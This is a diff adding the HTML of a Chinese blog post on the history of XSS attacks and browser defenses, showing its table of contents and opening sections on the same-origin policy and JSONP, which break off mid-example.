@@ -1,0 +1,2137 @@
+<!DOCTYPE html>
+<html lang="zh-cn" dir="ltr">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='XSS 攻防历史、原理与现代防御体系梳理'>
+<title>信任的代价：我眼中一部 XSS 攻防二十五年的演进史</title>
+
+<link rel='canonical' href='https://d4n-sec.github.io/p/%E4%BF%A1%E4%BB%BB%E7%9A%84%E4%BB%A3%E4%BB%B7%E6%88%91%E7%9C%BC%E4%B8%AD%E4%B8%80%E9%83%A8-xss-%E6%94%BB%E9%98%B2%E4%BA%8C%E5%8D%81%E4%BA%94%E5%B9%B4%E7%9A%84%E6%BC%94%E8%BF%9B%E5%8F%B2/'>
+
+
+<link rel="stylesheet" href="/scss/style.min.1a6eab8f97c7ad47119bcfe4ea87cc5227d4789df170608fabd9b3910bc037f2.css"><meta property='og:title' content='信任的代价：我眼中一部 XSS 攻防二十五年的演进史'>
+<meta property='og:description' content='XSS 攻防历史、原理与现代防御体系梳理'>
+<meta property='og:url' content='https://d4n-sec.github.io/p/%E4%BF%A1%E4%BB%BB%E7%9A%84%E4%BB%A3%E4%BB%B7%E6%88%91%E7%9C%BC%E4%B8%AD%E4%B8%80%E9%83%A8-xss-%E6%94%BB%E9%98%B2%E4%BA%8C%E5%8D%81%E4%BA%94%E5%B9%B4%E7%9A%84%E6%BC%94%E8%BF%9B%E5%8F%B2/'>
+<meta property='og:site_name' content='Dan`s Blog'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='Web安全' /><meta property='article:tag' content='XSS' /><meta property='article:tag' content='浏览器安全' /><meta property='article:published_time' content='2026-03-24T00:00:00&#43;08:00'/><meta property='article:modified_time' content='2026-03-24T00:00:00&#43;08:00'/>
+<meta name="twitter:title" content="信任的代价：我眼中一部 XSS 攻防二十五年的演进史">
+<meta name="twitter:description" content="XSS 攻防历史、原理与现代防御体系梳理">
+    <link rel="shortcut icon" href="https://d4n-picture-database.oss-cn-beijing.aliyuncs.com/img/paper-plane-64.webp" />
+
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="切换菜单">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    <img src="https://d4n-picture-database.oss-cn-beijing.aliyuncs.com/img/TX.jpg" width="300" height="300" class="site-logo" loading="lazy" alt="Avatar">
+                
+                </a>
+                
+                    <span class="emoji">🐹</span>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">Dan`s Blog</a></h1>
+            <h2 class="site-description">今人不见古时月</h2>
+        </div>
+    </header><ol class="social-menu">
+            
+                <li>
+                    <a 
+                        href='/%E5%85%B3%E4%BA%8E'
+                        target="_blank"
+                        title="contactMe"
+                        rel="me"
+                    >
+                        
+                        
+                            <?xml version="1.0" standalone="no"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg t="1709702435352" class="icon" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="8388" xmlns:xlink="http://www.w3.org/1999/xlink" width="200" height="200"><path d="M928 160H96c-17.7 0-32 14.3-32 32v640c0 17.7 14.3 32 32 32h832c17.7 0 32-14.3 32-32V192c0-17.7-14.3-32-32-32z m-40 110.8V792H136V270.8l-27.6-21.5 39.3-50.5 42.8 33.3h643.1l42.8-33.3 39.3 50.5-27.7 21.5z" fill="#bfbfbf" p-id="8389"></path><path d="M833.6 232L512 482 190.4 232l-42.8-33.3-39.3 50.5 27.6 21.5 341.6 265.6c20.2 15.7 48.5 15.7 68.7 0L888 270.8l27.6-21.5-39.3-50.5-42.7 33.2z" p-id="8390" fill="#bfbfbf"></path></svg>
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://github.com/d4n-sec'
+                        target="_blank"
+                        title="GitHub"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='http://wpa.qq.com/msgrd?v=3&amp;uin=1664022865&amp;site=qq&amp;menu=yes'
+                        target="_blank"
+                        title="QQNum"
+                        rel="me"
+                    >
+                        
+                        
+                            
+<?xml version="1.0" standalone="no"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg t="1709702077457" class="icon" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="13062" xmlns:xlink="http://www.w3.org/1999/xlink" width="200" height="200"><path d="M824.8 613.2c-16-51.4-34.4-94.6-62.7-165.3C766.5 262.2 689.3 112 511.5 112 331.7 112 256.2 265.2 261 447.9c-28.4 70.8-46.7 113.7-62.7 165.3-34 109.5-23 154.8-14.6 155.8 18 2.2 70.1-82.4 70.1-82.4 0 49 25.2 112.9 79.8 159-26.4 8.1-85.7 29.9-71.6 53.8 11.4 19.3 196.2 12.3 249.5 6.3 53.3 6 238.1 13 249.5-6.3 14.1-23.8-45.3-45.7-71.6-53.8 54.6-46.2 79.8-110.1 79.8-159 0 0 52.1 84.6 70.1 82.4 8.5-1.1 19.5-46.4-14.5-155.8z" p-id="13063" fill="#bfbfbf"></path></svg>
+                        
+                    </a>
+                </li>
+            
+        </ol><ol class="menu" id="main-menu">
+        
+        
+        
+        <li >
+            <a href='/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>主页</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/%E5%85%B3%E4%BA%8E/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="7" r="4" />
+  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
+</svg>
+
+
+
+                
+                <span>关于</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/archives/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>Archives</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/tools/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>Tools</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/search/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>Search</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/links/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M10 14a3.5 3.5 0 0 0 5 0l4 -4a3.5 3.5 0 0 0 -5 -5l-.5 .5" />
+  <path d="M14 10a3.5 3.5 0 0 0 -5 0l-4 4a3.5 3.5 0 0 0 5 5l.5 -.5" />
+</svg>
+
+
+
+                
+                <span>Links</span>
+            </a>
+        </li>
+        
+    </ol>
+    <div class="menu-bottom-section">
+        <ol class="menu">
+
+            
+                <li id="dark-mode-toggle">
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                    <span>暗色模式</span>
+                </li>
+            
+        </ol>
+    </div>
+</aside>
+
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">目录</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ol>
+    <li><a href="#信任的代价我眼中一部-xss-攻防二十五年的演进史">信任的代价：我眼中一部 XSS 攻防二十五年的演进史</a>
+      <ol>
+        <li><a href="#时间线速览">时间线速览</a></li>
+        <li><a href="#序章一个开放世界以及它必须付出的代价19931996">序章：一个开放世界，以及它必须付出的代价（1993–1996）</a>
+          <ol>
+            <li><a href="#同源策略第一道防线的诞生1996">同源策略：第一道防线的诞生（1996）</a></li>
+            <li><a href="#sop-的原罪嵌入与读取的分裂">SOP 的原罪：嵌入与读取的分裂</a></li>
+            <li><a href="#旁白jsonp用嵌入冒充读取的民间发明">旁白：JSONP——用嵌入冒充读取的民间发明</a></li>
+            <li><a href="#sop-防不住的事注入执行">SOP 防不住的事：注入执行</a></li>
+          </ol>
+        </li>
+        <li><a href="#第一章语义歧义一切漏洞的共同根源2000">第一章：语义歧义——一切漏洞的共同根源（2000）</a>
+          <ol>
+            <li><a href="#11-命名漏洞有了名字">1.1 命名：漏洞有了名字</a></li>
+            <li><a href="#12-为什么会有-xss语义歧义">1.2 为什么会有 XSS？语义歧义</a></li>
+            <li><a href="#13-最早的-reflected-xss镜像攻击">1.3 最早的 Reflected XSS：镜像攻击</a></li>
+          </ol>
+        </li>
+        <li><a href="#第二章蠕虫纪元xss-第一次露出獠牙2005">第二章：蠕虫纪元——XSS 第一次露出獠牙（2005）</a>
+          <ol>
+            <li><a href="#21-samy以及那个改变一切的周末">2.1 Samy，以及那个改变一切的周末</a></li>
+            <li><a href="#22-为什么-reflected-xss-做不到这件事">2.2 为什么 Reflected XSS 做不到这件事</a></li>
+            <li><a href="#23-samy-面对的工程挑战绕过黑名单">2.3 Samy 面对的工程挑战——绕过黑名单</a></li>
+          </ol>
+        </li>
+        <li><a href="#第三章猫和老鼠黑名单时代的必然崩塌20032008">第三章：猫和老鼠——黑名单时代的必然崩塌（2003–2008）</a>
+          <ol>
+            <li><a href="#31-直觉性的错误">3.1 直觉性的错误</a></li>
+            <li><a href="#32-一场永远追不上的军备竞赛">3.2 一场永远追不上的军备竞赛</a></li>
+            <li><a href="#33-黑名单失败的本质">3.3 黑名单失败的本质</a></li>
+          </ol>
+        </li>
+        <li><a href="#第四章消除语义歧义输出编码的正确姿势20052010">第四章：消除语义歧义——输出编码的正确姿势（2005–2010）</a>
+          <ol>
+            <li><a href="#41-对症下药">4.1 对症下药</a></li>
+            <li><a href="#42-上下文是关键一套编码解决不了所有问题">4.2 上下文是关键：一套编码解决不了所有问题</a></li>
+            <li><a href="#43-框架内建防御默认安全显式危险">4.3 框架内建防御：&ldquo;默认安全，显式危险&rdquo;</a></li>
+            <li><a href="#44-httponly-cookie切断最直接的战果路径2002">4.4 HttpOnly Cookie：切断最直接的战果路径（2002）</a></li>
+          </ol>
+        </li>
+        <li><a href="#第五章dom-的暗流服务器看不见的战场2005-年-7-月">第五章：DOM 的暗流——服务器看不见的战场（2005 年 7 月）</a>
+          <ol>
+            <li><a href="#51-一篇让服务器失明的论文">5.1 一篇让服务器失明的论文</a></li>
+            <li><a href="#52-一个必要的认知转折浏览器是独立的第三方">5.2 一个必要的认知转折：浏览器是独立的第三方</a></li>
+            <li><a href="#53-浏览器自导自演">5.3 浏览器自导自演</a></li>
+            <li><a href="#54-源source与汇sink追踪数据流">5.4 源（Source）与汇（Sink）：追踪数据流</a></li>
+          </ol>
+        </li>
+        <li><a href="#第六章策略即防御csp-的诞生与演进20102016">第六章：策略即防御——CSP 的诞生与演进（2010–2016）</a>
+          <ol>
+            <li><a href="#61-从净化到限制执行权">6.1 从&quot;净化&quot;到&quot;限制执行权&quot;</a></li>
+            <li><a href="#62-白名单运行机制">6.2 白名单运行机制</a></li>
+            <li><a href="#63-nonce给合法脚本发通行证">6.3 Nonce：给合法脚本发&quot;通行证&quot;</a></li>
+            <li><a href="#64-strict-dynamic信任的传递">6.4 strict-dynamic：信任的传递</a></li>
+            <li><a href="#65-csp-也不是无懈可击">6.5 CSP 也不是无懈可击</a></li>
+          </ol>
+        </li>
+        <li><a href="#第七章富文本的噩梦当防御遇上业务需求20122018">第七章：富文本的噩梦——当防御遇上业务需求（2012–2018）</a>
+          <ol>
+            <li><a href="#71-一个让所有防御方案失灵的场景">7.1 一个让所有防御方案&quot;失灵&quot;的场景</a></li>
+            <li><a href="#72-为什么正则做不到这件事">7.2 为什么正则做不到这件事</a></li>
+            <li><a href="#73-dompurify用解析器来对抗解析器">7.3 DOMPurify：用解析器来对抗解析器</a></li>
+          </ol>
+        </li>
+        <li><a href="#第八章框架时代把安全成本内化到工具里20132020">第八章：框架时代——把安全成本内化到工具里（2013–2020）</a>
+          <ol>
+            <li><a href="#81-工程现实安全不是唯一的指标">8.1 工程现实：安全不是唯一的指标</a></li>
+            <li><a href="#82-react让安全的写法比危险的写法更短">8.2 React：让安全的写法比危险的写法更短</a></li>
+            <li><a href="#83-vue-和-angular-的相同哲学">8.3 Vue 和 Angular 的相同哲学</a></li>
+            <li><a href="#84-框架安全的新前线ssr-状态注入">8.4 框架安全的新前线：SSR 状态注入</a></li>
+          </ol>
+        </li>
+        <li><a href="#第九章从-dom-sink-断根trusted-types-与纵深防御2019今">第九章：从 DOM Sink 断根——Trusted Types 与纵深防御（2019–今）</a>
+          <ol>
+            <li><a href="#91-最后一公里问题">9.1 最后一公里问题</a></li>
+            <li><a href="#92-trusted-types让危险-api-拒绝普通字符串">9.2 Trusted Types：让危险 API 拒绝普通字符串</a></li>
+            <li><a href="#93-纵深防御不是防线的叠加而是失效的容忍">9.3 纵深防御：不是防线的叠加，而是失效的容忍</a></li>
+          </ol>
+        </li>
+        <li><a href="#第十章corssop-的授权机制与正确实践">第十章：CORS——SOP 的授权机制与正确实践</a>
+          <ol>
+            <li><a href="#101-官方开的后门">10.1 官方开的后门</a></li>
+            <li><a href="#102-简单请求与预检请求cors-机制里最容易被误解的设计">10.2 简单请求与预检请求：CORS 机制里最容易被误解的设计</a></li>
+            <li><a href="#103-一个常见的混淆csp-与-cors-是两条平行线">10.3 一个常见的混淆：CSP 与 CORS 是两条平行线</a></li>
+          </ol>
+        </li>
+        <li><a href="#结语没有银弹只有体系">结语：没有银弹，只有体系</a></li>
+        <li><a href="#附录防御速查">附录：防御速查</a></li>
+        <li><a href="#参考">参考</a></li>
+      </ol>
+    </li>
+  </ol>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+            <main class="main full-width">
+    <article class="main-article">
+    <header class="article-header">
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" >
+                网络安全
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/p/%E4%BF%A1%E4%BB%BB%E7%9A%84%E4%BB%A3%E4%BB%B7%E6%88%91%E7%9C%BC%E4%B8%AD%E4%B8%80%E9%83%A8-xss-%E6%94%BB%E9%98%B2%E4%BA%8C%E5%8D%81%E4%BA%94%E5%B9%B4%E7%9A%84%E6%BC%94%E8%BF%9B%E5%8F%B2/">信任的代价：我眼中一部 XSS 攻防二十五年的演进史</a>
+        </h2>
+    
+        
+        <h3 class="article-subtitle">
+            XSS 攻防历史、原理与现代防御体系梳理
+        </h3>
+        
+    </div>
+
+    
+    
+    
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">Mar 24, 2026 00:00 &#43;0800</time>
+            </div>
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-time--reading">
+                    阅读时长: 36 分钟
+                </time>
+            </div>
+        
+    </footer>
+    
+
+    
+</div>
+
+</header>
+
+    <section class="article-content">
+    
+    
+    <h1 id="信任的代价我眼中一部-xss-攻防二十五年的演进史">信任的代价：我眼中一部 XSS 攻防二十五年的演进史</h1>
+<blockquote>
+<p><em>&ldquo;所有注入漏洞的本质，都是语义歧义——<br>
+同一段数据，在不同的解析上下文中，被赋予了截然不同的含义。<br>
+防御的本质，是在数据越过上下文边界的那一刻，消除这种歧义。&rdquo;</em></p>
+</blockquote>
+<hr>
+<h2 id="时间线速览">时间线速览</h2>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">1995 ── JavaScript 诞生（10天）；浏览器成为可编程客户端
+</span></span><span class="line"><span class="cl">1996 ── 同源策略（SOP）随 Netscape 2.0 引入，奠定 Web 安全基石
+</span></span><span class="line"><span class="cl">1999 ── XSS 漏洞大量出现；Hotmail 遭遇早期攻击
+</span></span><span class="line"><span class="cl">2000 ── 微软工程师正式命名 &#34;Cross-Site Scripting&#34;，缩写 XSS
+</span></span><span class="line"><span class="cl">2002 ── HttpOnly Cookie 属性由微软 IE6 SP1 率先引入
+</span></span><span class="line"><span class="cl">2003 ── 黑名单过滤兴起；攻防进入无休止的猫鼠游戏
+</span></span><span class="line"><span class="cl">2005 ── Samy 蠕虫 20 小时感染 100 万 MySpace 用户（10月4日）
+</span></span><span class="line"><span class="cl">2005 ── Amit Klein 论文正式定义 DOM-based XSS（7月）
+</span></span><span class="line"><span class="cl">2010 ── Content Security Policy（CSP）草案发布
+</span></span><span class="line"><span class="cl">2012 ── DOMPurify 发布；富文本防御进入可靠阶段
+</span></span><span class="line"><span class="cl">2013 ── React 发布；前端框架重塑安全默认值
+</span></span><span class="line"><span class="cl">2019 ── Trusted Types 进入 Chrome；从 DOM Sink 断根
+</span></span></code></pre></td></tr></table>
+</div>
+</div><hr>
+<h2 id="序章一个开放世界以及它必须付出的代价19931996">序章：一个开放世界，以及它必须付出的代价（1993–1996）</h2>
+<p>1993 年，当第一个图形化浏览器 Mosaic 出现时，互联网还是静默的文档海洋。网页就是网页——文字、图片、超链接，仅此而已。Web 的设计哲学源于学术界的开放精神：信息应当自由流动，任何人都可以链接任何人的资源。</p>
+<p>然后，1995 年，Brendan Eich 用了整整 10 天，为 Netscape 浏览器写出了 JavaScript。</p>
+<p>浏览器从此不再是一个被动的文档阅读器，而变成了一台<strong>可编程的客户端机器</strong>。服务器可以下发一段代码，浏览器会执行它。Web 突然拥有了真正的交互能力——这是好事，也是所有麻烦的起点。</p>
+<h3 id="同源策略第一道防线的诞生1996">同源策略：第一道防线的诞生（1996）</h3>
+<p>Netscape 的工程师们很快意识到了危险：如果浏览器可以执行任意代码，那么一个恶意网站的脚本是否可以读取用户另一个标签页里的银行账户数据？</p>
+<p>于是，<strong>同源策略（Same-Origin Policy，SOP）</strong> 随 Netscape 2.0 在 1996 年引入。规则非常简单：</p>
+<blockquote>
+<p><strong>不同&quot;源&quot;（Origin = 协议 + 域名 + 端口）的页面，不能读取彼此的数据。</strong></p>
+</blockquote>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">// SOP 的判断逻辑
+</span></span><span class="line"><span class="cl">https://bank.com:443  ←→  https://bank.com:443    ✅ 同源，可以互相读取
+</span></span><span class="line"><span class="cl">https://bank.com:443  ←→  http://bank.com:80      ❌ 协议不同
+</span></span><span class="line"><span class="cl">https://bank.com:443  ←→  https://evil.com:443    ❌ 域名不同
+</span></span><span class="line"><span class="cl">https://bank.com:443  ←→  https://bank.com:8080   ❌ 端口不同
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>SOP 非常成功地解决了一个问题：来自 <code>evil.com</code> 的脚本，无法读取你在 <code>bank.com</code> 页面上的 Cookie 或账户数据。</p>
+<p>但 SOP 有一个生来就有的、无法消除的&quot;宽容&quot;。</p>
+<h3 id="sop-的原罪嵌入与读取的分裂">SOP 的原罪：嵌入与读取的分裂</h3>
+<p>Web 要正常运转，就必须允许跨域引用。你的网站需要引用 CDN 上的 jQuery，Google 字体，友站的图片。如果 SOP 完全禁止跨域操作，互联网就分裂成了无数个孤岛。</p>
+<p>所以 SOP 从设计之初就把跨域操作分成了两类，并用截然不同的规则对待：</p>
+<div class="table-wrapper"><table>
+  <thead>
+      <tr>
+          <th>操作</th>
+          <th>典型例子</th>
+          <th>SOP 态度</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td><strong>嵌入（Embedding）</strong></td>
+          <td><code>&lt;script src&gt;</code>, <code>&lt;img&gt;</code>, <code>&lt;iframe&gt;</code></td>
+          <td><strong>默认允许</strong></td>
+      </tr>
+      <tr>
+          <td><strong>读取（Reading）</strong></td>
+          <td><code>fetch()</code>, <code>XMLHttpRequest</code></td>
+          <td><strong>默认禁止</strong></td>
+      </tr>
+  </tbody>
+</table></div>
+<p>逻辑是：&quot;<strong>让你看</strong>&ldquo;和&rdquo;<strong>让你拿</strong>&ldquo;是两码事。你可以把百度的 Logo 图片嵌入你的页面展示，但你的 JavaScript 不能读取这张图片的二进制内容。</p>
+<p>这个设计在 1996 年是合理的折中。但没有人预见到，这个&quot;宽容的嵌入&quot;将成为几乎所有 Web 攻击的共同根源：</p>
+<ul>
+<li>CSRF 利用 <code>&lt;img src&gt;</code> 跨域发请求</li>
+<li>Clickjacking 利用 <code>&lt;iframe&gt;</code> 跨域嵌入页面</li>
+<li><strong>XSS 利用 <code>&lt;script src&gt;</code>（或注入内联脚本）跨域执行代码</strong></li>
+</ul>
+<p>所有后来的安全机制——CSP、X-Frame-Options、SameSite Cookie——本质上都是在给这个&quot;宽容的嵌入&quot;打补丁。</p>
+<p>这个&quot;宽容的嵌入&quot;还引发了一个有趣的历史插曲。</p>
+<h3 id="旁白jsonp用嵌入冒充读取的民间发明">旁白：JSONP——用嵌入冒充读取的民间发明</h3>
+<p>SOP 禁止了跨域读取，但开发者们很快就发现了一个漏洞：<code>&lt;script src&gt;</code> 属于嵌入，是被允许的。而 <code>&lt;script&gt;</code> 标签加载的 JS 文件，浏览器会直接执行。</p>
+<p>这意味着，如果一个跨域接口返回的不是普通 JSON 数据，而是一段<strong>可执行的 JavaScript 代码</strong>，那 <code>&lt;script src&gt;</code> 就能绕开 SOP 的读取限制，间接拿到数据。</p>
+<p>这就是 <strong>JSONP（JSON with Padding）</strong> 的诞生逻辑，大约在 2005 年前后被广泛采用：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="c">&lt;!-- a.com 想读取 b.com 的数据，SOP 禁止直接 fetch --&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="c">&lt;!-- 但可以这样：让 b.com 把数据&#34;包裹&#34;进一个函数调用 --&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">script</span> <span class="na">src</span><span class="o">=</span><span class="s">&#34;https://b.com/api/user?callback=handleData&#34;</span><span class="p">&gt;&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c">&lt;!-- b.com 的响应不是 JSON，而是一段 JS 代码： --&gt;</span>
